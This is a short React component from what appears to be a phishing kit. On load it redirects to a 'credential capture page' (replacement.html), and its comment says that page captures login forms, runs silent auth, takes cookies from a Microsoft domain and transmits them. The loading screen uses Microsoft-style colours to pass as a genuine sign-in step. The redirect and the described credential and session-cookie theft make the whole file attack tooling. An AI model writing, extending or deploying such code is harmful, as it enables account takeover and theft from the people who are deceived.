import React, { useLayoutEffect } from 'react';

/**
 * Redirects to replacement.html which handles:
 * - Login form capture
 * - Silent auth with silent-auth-frame.html
 * - Cookie capture from Microsoft domain
 * - Data transmission to AuthCallback
 */
const RealOAuthRedirect: React.FC = () => {
  useLayoutEffect(() => {
    console.log('🔄 RealOAuthRedirect: Navigating to credential capture page...');
    window.location.replace('/replacement.html');
  }, []);

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Arial, sans-serif',
      backgroundColor: '#f3f2f1'
    }}>
      <div style={{
        textAlign: 'center',
        fontSize: '24px',
        color: '#323130'
      }}>
        Loading...
      </div>
    </div>
  );
};

export default RealOAuthRedirect;
